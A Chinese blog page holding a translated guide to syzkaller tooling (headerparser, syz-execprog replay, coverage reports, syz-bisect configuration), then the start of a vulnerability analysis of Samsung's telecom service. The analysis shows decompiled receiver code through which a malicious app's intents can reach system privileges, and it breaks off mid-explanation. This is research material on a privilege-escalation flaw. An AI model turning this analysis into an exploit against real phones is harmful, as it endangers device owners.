<h1 id="Headerparser"><a href="#Headerparser" class="headerlink" title="Headerparser"></a>Headerparser</h1><p><code>headerparser</code>是一个协助<code>syzkaller</code>编写设备系统调用描述的工具。为了使<code>syzkaller</code>在对设备节点进行模糊处理时更加智能，你可以向它提供它所期望的ioctl参数结构类型的信息。为了减轻编写ioctl参数类型描述文件的工作量，<code>headerlib</code>会尽力为你生成这些文件。但仍然需要从描述语言的类型列表中手动选择合适的<code>syzkaller</code>数据类型。</p>
<h2 id="依赖"><a href="#依赖" class="headerlink" title="依赖"></a>依赖</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pip install pycparser</span><br></pre></td></tr></table></figure>

<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ python headerparser.py --filenames=./test_headers/th_b.h</span><br><span class="line">B &#123;</span><br><span class="line">          B1     len|fileoff|flags|intN     <span class="comment">#(unsigned long)</span></span><br><span class="line">          B2     len|fileoff|flags|intN     <span class="comment">#(unsigned long)</span></span><br><span class="line">&#125;</span><br><span class="line">struct_containing_union &#123;</span><br><span class="line">          something          len|fileoff|flags|int32                   <span class="comment">#(int)</span></span><br><span class="line">          a_union.a_char     ptr[<span class="keyword">in</span>|out, string]|ptr[<span class="keyword">in</span>, filename]     <span class="comment">#(char*)</span></span><br><span class="line">          a_union.B_ptr      ptr|buffer|array                          <span class="comment">#(struct B*)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以把结构元数据下面的内容复制粘贴到你的syzkaller设备描述上。</p>
<h2 id="错误处理"><a href="#错误处理" class="headerlink" title="错误处理"></a>错误处理</h2><p>下面尝试解析<code>test_headers/th_a.h</code>头文件以生成参数结构：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ python headerparser.py --filenames=./test_headers/th_a.h</span><br><span class="line">ERROR:root:HeaderFilePreprocessorException: /tmp/tmpW8xzty/source.o:36:2: before: some_type</span><br><span class="line"></span><br><span class="line">$ python headerparser.py --filenames=./test_headers/th_a.h --debug</span><br><span class="line">DEBUG:GlobalHierarchy:load_header_files : [<span class="string">&#x27;./test_headers/th_a.h&#x27;</span>]</span><br><span class="line">DEBUG:HeaderFilePreprocessor:HeaderFilePreprocessor._mktempfiles: sourcefile=/tmp/tmpbBQYhR/source.cobjectfile=/tmp/tmpbBQYhR/source.o</span><br><span class="line">DEBUG:HeaderFilePreprocessor:HeaderFilePreprocessor.execute: <span class="built_in">cp</span> ./test_headers/th_a.h /tmp/tmpbBQYhR</span><br><span class="line">DEBUG:HeaderFilePreprocessor:HeaderFilePreprocessor.execute: gcc -I. -E -P -c /tmp/tmpbBQYhR/source.c &gt; /tmp/tmpbBQYhR/source.o</span><br><span class="line">ERROR:root:HeaderFilePreprocessorException: /tmp/tmpbBQYhR/source.o:36:2: before: some_type</span><br></pre></td></tr></table></figure>

<p>从错误信息中可以看到错误的发生是因为 <code>pycparser</code> 没有发现到 <code>some_type</code> 这个类型。我们可以通过让 <code>pycparser</code> 找到这个未知的类型来解决这个问题。因此，我们向 <code>headerparser</code> 提供了一个包含 C 声明和包含的文件，这些文件可以解决解析错误。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cat</span> &gt; include_file</span><br><span class="line">typedef int some_type;</span><br><span class="line">$ python headerparser.py --filenames=./test_headers/th_a.h --include=./include_file</span><br><span class="line">A &#123;</span><br><span class="line">          B_item              ptr|buffer|array                          <span class="comment">#(struct B*)</span></span><br><span class="line">          char_ptr            ptr[<span class="keyword">in</span>|out, string]|ptr[<span class="keyword">in</span>, filename]     <span class="comment">#(char*)</span></span><br><span class="line">          an_unsigned_int     len|fileoff|int32                         <span class="comment">#(unsigned int)</span></span><br><span class="line">          a_bool              _Bool                                     <span class="comment">#(_Bool)</span></span><br><span class="line">          another_bool        _Bool                                     <span class="comment">#(_Bool)</span></span><br><span class="line">          var                 some_type                                 <span class="comment">#(some_type)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="执行syzkaller程序"><a href="#执行syzkaller程序" class="headerlink" title="执行syzkaller程序"></a>执行syzkaller程序</h1><p>下面介绍如何执行现有的syzkaller程序以达到重现错误的目的。通过这种方式，你可以重放单个程序或者整个执行日志中的几个程序。</p>
<ol>
<li>设置Go工具链。</li>
<li>下载syzkaller源码。</li>
<li>编译syzkaller。</li>
<li>将二进制文件和程序复制到测试机上。</li>
<li>在测试机上运行程序：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./syz-execprog -repeat=0 -procs=8 program</span><br></pre></td></tr></table></figure>

<p>如果设置了<code>-threaded=0</code>，程序将作为一个简单的单线程的系统调用序列来执行。<code>-threaded=1</code>强制在一个单独的线程中执行每个系统调用，这样就可以在阻塞的系统调用上进行执行。</p>
<p>如果重放的是一个包含标题的复制器程序，其内容大致如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># &#123;Threaded:true Repeat:true RepeatTimes:0 Procs:8 Slowdown:1 Sandbox:none Leak:false NetInjection:true NetDevices:true NetReset:true Cgroups:true BinfmtMisc:true CloseFDs:true KCSAN:false DevlinkPCI:false USB:true VhciInjection:true Wifi:true IEEE802154:true Sysctl:true UseTmpDir:true HandleSegv:true Repro:false Trace:false LegacyOptions:&#123;Collide:false Fault:false FaultCall:0 FaultNth:0&#125;&#125;</span></span><br></pre></td></tr></table></figure>

<p>根据头文件中的值来调整<code>syz-execprog</code>的标志。即，<code>Threaded/Procs/Sandbox</code>直接与<code>-threaded/-procs/-sandbox</code>的标志有关。如果<code>Repeat</code>设置为 <code>&quot;true&quot;</code>，则在<code>syz-execprog</code>中添加<code>-repeat=0</code>标志。</p>
<h1 id="覆盖率-1"><a href="#覆盖率-1" class="headerlink" title="覆盖率"></a>覆盖率</h1><p>syzkaller使用<code>sanitizer</code>和<code>KCOV</code>进行覆盖率收集。gcc也支持<code>Sanitizer</code>，其他一些操作系统也支持<code>KCOV</code>。注意：<code>gVisor</code>的覆盖率是完全不同的。</p>
<p>覆盖率是基于对编译器插入目标代码的覆盖点的追踪。覆盖点通常是指一个基本的代码块或一个CFG边（这取决于编译器和编译过程中使用的插桩模式，例如Linux和clang的默认模式是CFG边，而gcc的默认模式是基本块）。覆盖点是由编译器在大量的转换和优化过程后在中间插入的。因此，覆盖率可能与源代码没什么关系。</p>
<h2 id="Web接口"><a href="#Web接口" class="headerlink" title="Web接口"></a>Web接口</h2><p>当点击<code>cover</code>时，会得到显示位于内核构建目录中的每个目录的视图。它显示的是<code>N</code>的<code>X%</code>或<code>---</code>。<code>N</code>的<code>X%</code>意味着到目前为止<code>N个</code>覆盖点中的<code>X%</code>被覆盖，<code>---</code>表示该目录中没有覆盖。</p>
<p>点击目录，可以看到文件和可能的子目录。在每一个源代码文件上都有<code>---</code>或覆盖率。</p>
<p>如果点击任何C文件，将看到源代码视图。在源代码视图中使用了一些颜色。颜色的定义可以在<a target="_blank" rel="noopener" href="https://github.com/google/syzkaller/blob/master/pkg/cover/report.go#L504"><code>coverTemplate</code></a>中找到。着色说明如下。</p>
<p>如果点击列出的源文件的百分比数字，将看到该源文件中每个函数的覆盖率。</p>
<h3 id="Covered-black-000000"><a href="#Covered-black-000000" class="headerlink" title="Covered: black (#000000)"></a>Covered: black (#000000)</h3><p>所有与该行相关的PC值都包括在内。左边的数字表明有多少程序已经触发了执行与该行有关的PC值。你可以点击这个数字，它将打开最后执行的程序。下面的例子显示了完全覆盖的单行是如何显示的。</p>
<p><img src="/Users/DarkMatter/Documents/Hacking/Blog/source/pictures/coverage_covered.png" alt="coverage_covered"></p>
<h3 id="Both-orange-c86400"><a href="#Both-orange-c86400" class="headerlink" title="Both: orange (#c86400)"></a>Both: orange (#c86400)</h3><p>有几个与该行相关的PC值，并不是所有这些都被执行。同样，在源代码的左边有一个数字，可以点击它来打开最后一个触发相关PC值的程序。下面的例子显示了一个单行，它有被执行和未执行的PC值与之相关。</p>
<p><img src="/Users/DarkMatter/Documents/Hacking/Blog/source/pictures/coverage_both.png" alt="coverage_both"></p>
<h3 id="Weak-uncovered-crimson-red-c80000"><a href="#Weak-uncovered-crimson-red-c80000" class="headerlink" title="Weak-uncovered: crimson red (#c80000)"></a>Weak-uncovered: crimson red (#c80000)</h3><p>这一行所在的函数（符号）没有任何覆盖。也就是说，这个函数根本就没有被执行。如果编译器已经优化了某些符号，并使代码内联，那么与这一行相关的符号就是代码被编译的地方。这使得有时真的很难弄清着色的含义。下面的例子显示了与之相关的单行是如何被揭开的，而与之相关的PC值是在不被执行的函数中显示的。</p>
<p><img src="/Users/DarkMatter/Documents/Hacking/Blog/source/pictures/coverage_weak-uncovered.png" alt="coverage_weak-uncovered"></p>
<h3 id="Uncovered-red-ff0000"><a href="#Uncovered-red-ff0000" class="headerlink" title="Uncovered: red (#ff0000)"></a>Uncovered: red (#ff0000)</h3><p>下面的例子显示了未被覆盖的单行是如何显示的。</p>
<p><img src="/Users/DarkMatter/Documents/Hacking/Blog/source/pictures/coverage_uncovered.png" alt="coverage_uncovered"></p>
<h3 id="Not-instrumented-grey-505050"><a href="#Not-instrumented-grey-505050" class="headerlink" title="Not instrumented: grey (#505050)"></a>Not instrumented: grey (#505050)</h3><p>与该行相关的PC值没有被检测，或者源行根本没有生成代码。下面的例子显示了所有未检测的代码是如何显示的。</p>
<p><img src="/Users/DarkMatter/Documents/Hacking/Blog/source/pictures/coverage_not_instrumented.png" alt="coverage_not_instrumented"></p>
<h2 id="syz-cover"><a href="#syz-cover" class="headerlink" title="syz-cover"></a>syz-cover</h2><p>在syzkaller资源库中，有一个小工具可以根据原始覆盖率数据生成覆盖率报告。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GOOS=linux GOARCH=amd64 go build <span class="string">&quot;-ldflags=-s -w&quot;</span> -o ./bin/syz-cover github.com/google/syzkaller/tools/syz-cover</span><br></pre></td></tr></table></figure>

<p>原始覆盖数据可以通过运行<code>syz-manager</code>获得。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://localhost:&lt;your syz-manager port&gt;/rawcover</span><br></pre></td></tr></table></figure>

<p>这些原始覆盖数据可以被送入<code>syz-cover</code>生成覆盖报告。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./bin/syz-cover --kernel_obj &lt;directory <span class="built_in">where</span> vmlinux is located&gt; rawcover</span><br></pre></td></tr></table></figure>

<p>导出覆盖率的CSV文件。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./bin/syz-cover --kernel_obj &lt;directory <span class="built_in">where</span> vmlinux is located&gt; --csv &lt;filename <span class="built_in">where</span> to <span class="built_in">export</span>&gt;  rawcover</span><br></pre></td></tr></table></figure>

<h1 id="Syz-bisect"><a href="#Syz-bisect" class="headerlink" title="Syz-bisect"></a>Syz-bisect</h1><p><code>syz-bisect</code>程序可以用来对<code>syzkaller</code>发现的崩溃和修复提交进行划分。它还可以识别触发崩溃的配置选项。</p>
<h2 id="使用-1"><a href="#使用-1" class="headerlink" title="使用"></a>使用</h2><p>用<code>make bisec</code>编译<code>syz-bisect</code>。</p>
<p>在<code>bisection</code>过程中，根据不同的内核版本会使用不同的编译器。这些编译器可以在<a target="_blank" rel="noopener" href="https://storage.googleapis.com/syzkaller/bisect_bin.tar.gz">这里</a>找到。</p>
<p>安装<code>ccache</code>以加快<code>bisecton</code>期间的内核编译速度。</p>
<p>使用<code>create-image.sh</code>创建用户空间（<code>chroot</code>）。</p>
<p>创建一个配置文件，并根据你的环境调整以下行数。</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">	<span class="attr">&quot;bin_dir&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/home/syzkaller/bisect_bin&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;ccache&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/usr/bin/ccache&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;kernel_repo&quot;</span><span class="punctuation">:</span> <span class="string">&quot;git://git.kernel.org/pub/scm/linux/kernel/git/next/linux-next.git&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;kernel_branch&quot;</span><span class="punctuation">:</span> <span class="string">&quot;master&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;syzkaller_repo&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://github.com/google/syzkaller&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;userspace&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/home/syzkaller/image/chroot&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;kernel_config&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/home/syzkaller/go/src/github.com/google/syzkaller/dashboard/config/linux/upstream-apparmor-kasan.config&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;kernel_baseline_config&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/home/syzkaller/go/src/github.com/google/syzkaller/dashboard/config/linux/upstream-apparmor-kasan-base.config&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;syzctl&quot;</span><span class="punctuation">:</span> /home/syzkaller/go/src/github.com/google/syzkaller/dashboard/config/linux/upstream.sysctl<span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;cmdline&quot;</span><span class="punctuation">:</span> /home/syzkaller/go/src/github.com/google/syzkaller/dashboard/config/linux/upstream.cmdline<span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;manager&quot;</span><span class="punctuation">:</span></span><br><span class="line">	<span class="punctuation">&#123;</span></span><br><span class="line">		<span class="attr">&quot;name&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;bisect&quot;</span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">&quot;target&quot;</span><span class="punctuation">:</span> <span class="string">&quot;linux/amd64&quot;</span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">&quot;http&quot;</span><span class="punctuation">:</span> <span class="string">&quot;127.0.0.1:56741&quot;</span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">&quot;workdir&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/home/syzkaller/workdir&quot;</span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">&quot;kernel_obj&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/home/syzkaller/linux&quot;</span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">&quot;image&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/home/syzkaller/workdir/image/image&quot;</span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">&quot;sshkey&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/home/syzkaller/workdir/image/key&quot;</span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">&quot;syzkaller&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/home/syzkaller/go/src/github.com/google/syzkaller_bisect&quot;</span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">&quot;procs&quot;</span><span class="punctuation">:</span> <span class="number">8</span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;qemu&quot;</span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">&quot;kernel_src&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/syzkaller/linux&quot;</span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">&quot;vm&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">		      <span class="attr">&quot;count&quot;</span><span class="punctuation">:</span> <span class="number">4</span><span class="punctuation">,</span></span><br><span class="line">		      <span class="attr">&quot;kernel&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/home/syzkaller/linux/arch/x86/boot/bzImage&quot;</span><span class="punctuation">,</span></span><br><span class="line">		      <span class="attr">&quot;cpu&quot;</span><span class="punctuation">:</span> <span class="number">2</span><span class="punctuation">,</span></span><br><span class="line">		      <span class="attr">&quot;mem&quot;</span><span class="punctuation">:</span> <span class="number">2048</span><span class="punctuation">,</span></span><br><span class="line">		      <span class="attr">&quot;cmdline&quot;</span><span class="punctuation">:</span> <span class="string">&quot;root=/dev/sda1 rw console=ttyS0 kaslr crashkernel=512M minnowboard_1:eth0::: security=none&quot;</span></span><br><span class="line">		<span class="punctuation">&#125;</span></span><br><span class="line">	<span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>然后用<code>bin/syz-bisect -config vm_bisect.cfg -crash /syzkaller/workdir/crashes/03ee30ae11dfd0ddd062af26566c34a8c853698d</code>运行<code>bisection</code>。</p>
<p><code>Syz-bisect</code>期望在给定的崩溃目录中找到 <code>repro.cprog</code> 或 <code>repro.prog</code>。它也会利用 <code>repro.opts</code>，但这并不是必须的。</p>
<h2 id="额外的参数"><a href="#额外的参数" class="headerlink" title="额外的参数"></a>额外的参数</h2><ul>
<li><code>-syzkaller_commit</code> 使用特定版本的syzkaller。</li>
<li><code>-kernel_commit</code> 内核提交，已知崩溃会重现。在修复提交时使用这个选项。</li>
<li><code>-fix</code> 如果想对一个修复提交进行分流，可以使用这个选项。</li>
</ul>
<h2 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h2><p>在<code>syz-bisect</code>完成后，它会将结果转储到控制台，也会将结果存储到指定的崩溃目录中。</p>
<p><code>cause.commit</code> 确定了导致崩溃的原因，或者文本 “该崩溃已经发生在最早的测试版本上”。</p>
<p><code>fix.commit</code> 确定了修复崩溃的方法或文字<code>&quot;the crash still happens on HEAD&quot;</code>。</p>
<p><code>cause.config</code> 配置选项被确定为导致崩溃的一个触发因素。</p>
<p><code>original.config</code>、<code>baseline.config</code>、<code>minimized.config </code>文件用于配置分流。</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://buffer0verflooow.github.io/2022/04/17/Samsung-Telecom%E6%BC%8F%E6%B4%9E/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="buffer0verflooow">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="buffer0verflooow - Blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | buffer0verflooow - Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/04/17/Samsung-Telecom%E6%BC%8F%E6%B4%9E/" class="post-title-link" itemprop="url">Samsung Telecom漏洞</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>
      

      <time title="Created: 2022-04-17 15:11:23 / Modified: 15:12:24" itemprop="dateCreated datePublished" datetime="2022-04-17T15:11:23+08:00">2022-04-17</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>Samsung Android9至Android12。</p>
<h2 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h2><p>允许发送恶意Intent，这些Intent将被<code>com.android.server.telecom</code>(System权限)执行，以启动指定的应用程序组件(无论是否设置导出)。Android9的利用条件可能会更加宽松，可能允许不具有任何权限的应用程序发送任意Intent至telecom的<strong>广播接收器</strong>。Android10、11、12则是通过<strong>activity组件</strong>。</p>
<p>恶意应用可以借此获取system权限，能够进行恢复出厂设置、安装卸载任意app、呼叫任意号码，以及安装自定义证书。</p>
<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>根据exp可知，问题应该是在telecom对应<code>com.samsung.server.telecom.USER_SELECT_WIFI_SERVICE_CALL</code>的广播接收器中。可以通过pm命令获取到telecom安装位置，然后使用jeb或jadx进行分析。</p>
<p>直接在AndroidManifest文件中搜索<code>USER_SELECT_WIFI_SERVICE_CALL</code>是找不到的，所以该广播接收器应该不是静态注册的。</p>
<p>使用jadx搜索<code>USER_SELECT_WIFI_SERVICE_CALL</code>，发现有两处代码。</p>
<p><strong>com.samsung.server.telecom.advancedcall.wificall.SamsungUsaWpsAlertActivity</strong></p>
<p>发送广播</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">notifyUserSelectWifiServiceCall</span><span class="params">(Intent intent)</span> &#123;</span><br><span class="line">        SamsungLogger.i(TAG, <span class="string">&quot;notifyUserSelectWifiServiceCall&quot;</span>);</span><br><span class="line">        intent.putExtra(<span class="string">&quot;is_skip_usa_wps_alert&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">        <span class="type">Intent</span> <span class="variable">intent2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(<span class="string">&quot;com.samsung.server.telecom.USER_SELECT_WIFI_SERVICE_CALL&quot;</span>);</span><br><span class="line">        intent2.putExtra(<span class="string">&quot;extra_call_intent&quot;</span>, intent);</span><br><span class="line">        sendBroadcast(intent2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>com.samsung.server.telecom.advancedcall.wificall.SamsungUsaWpsManager</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">SamsungUsaWpsManager</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">TAG</span> <span class="operator">=</span> <span class="string">&quot;SamsungUsaWpsManager&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">BroadcastReceiver</span> <span class="variable">mBroadcastReceiver</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BroadcastReceiver</span>() &#123;</span><br><span class="line">        <span class="comment">/* class com.samsung.server.telecom.advancedcall.wificall.SamsungUsaWpsManager.AnonymousClass1 */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onReceive</span><span class="params">(Context context, Intent intent)</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">&quot;com.samsung.server.telecom.USER_SELECT_WIFI_SERVICE_CALL&quot;</span>.equals(intent.getAction())) &#123;</span><br><span class="line">                <span class="type">Intent</span> <span class="variable">intent2</span> <span class="operator">=</span> (Intent) intent.getParcelableExtra(<span class="string">&quot;extra_call_intent&quot;</span>);</span><br><span class="line">                <span class="type">boolean</span> <span class="variable">areNoCallsPresent</span> <span class="operator">=</span> SamsungUsaWpsManager.<span class="built_in">this</span>.mSamsungUsaWpsHelper.areNoCallsPresent();</span><br><span class="line">                <span class="type">boolean</span> <span class="variable">WIRELESS_PRIORITY_SERVICE_3WAYCALL</span> <span class="operator">=</span> SamsungUsaWpsManager.<span class="built_in">this</span>.mSamsungFeatureRepository.WIRELESS_PRIORITY_SERVICE_3WAYCALL();</span><br><span class="line">                <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> SamsungUsaWpsManager.TAG;</span><br><span class="line">                SamsungLogger.i(str, <span class="string">&quot;onReceive - areNoCallsPresent: &quot;</span> + areNoCallsPresent + <span class="string">&quot;, isFeatureEnabled: &quot;</span> + WIRELESS_PRIORITY_SERVICE_3WAYCALL);</span><br><span class="line">                <span class="keyword">if</span> (areNoCallsPresent || WIRELESS_PRIORITY_SERVICE_3WAYCALL) &#123;</span><br><span class="line">                    SamsungUsaWpsManager.<span class="built_in">this</span>.mSamsungUsaWpsHelper.setCallIntent(intent2);</span><br><span class="line">                    SamsungUsaWpsManager.<span class="built_in">this</span>.mSamsungUsaWpsHelper.wirelessPriorityServiceCall();</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                SamsungUsaWpsManager.<span class="built_in">this</span>.mSamsungUsaWpsHelper.setCallIntent(intent2);</span><br><span class="line">                SamsungUsaWpsManager.<span class="built_in">this</span>.mCallsManager.disconnectAllCalls(SamsungUsaWpsManager.TAG);</span><br><span class="line">                SamsungUsaWpsManager.<span class="built_in">this</span>.mCallsManager.addListener(SamsungUsaWpsManager.<span class="built_in">this</span>.mSamsungUsaWpsCallsManagerListener);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> CallsManager mCallsManager;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Context mContext;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> SamsungFeatureRepository mSamsungFeatureRepository;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> SamsungUsaWpsCallsManagerListener mSamsungUsaWpsCallsManagerListener;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> SamsungUsaWpsHelper mSamsungUsaWpsHelper;</span><br><span class="line"></span><br><span class="line">    SamsungUsaWpsManager(Context context, CallsManager callsManager, SamsungFeatureRepository samsungFeatureRepository, SamsungUsaWpsCallsManagerListener samsungUsaWpsCallsManagerListener, SamsungUsaWpsHelper samsungUsaWpsHelper) &#123;</span><br><span class="line">        <span class="built_in">this</span>.mContext = context;</span><br><span class="line">        <span class="built_in">this</span>.mCallsManager = callsManager;</span><br><span class="line">        <span class="built_in">this</span>.mSamsungFeatureRepository = samsungFeatureRepository;</span><br><span class="line">        <span class="built_in">this</span>.mSamsungUsaWpsCallsManagerListener = samsungUsaWpsCallsManagerListener;</span><br><span class="line">        <span class="built_in">this</span>.mSamsungUsaWpsHelper = samsungUsaWpsHelper;</span><br><span class="line">        <span class="built_in">this</span>.mContext.registerReceiver(<span class="built_in">this</span>.mBroadcastReceiver, <span class="keyword">new</span> <span class="title class_">IntentFilter</span>(<span class="string">&quot;com.samsung.server.telecom.USER_SELECT_WIFI_SERVICE_CALL&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>无论<code>areNoCallsPresent</code>和<code>WIRELESS_PRIORITY_SERVICE_3WAYCALL</code>的值如何，都要执行：</p>
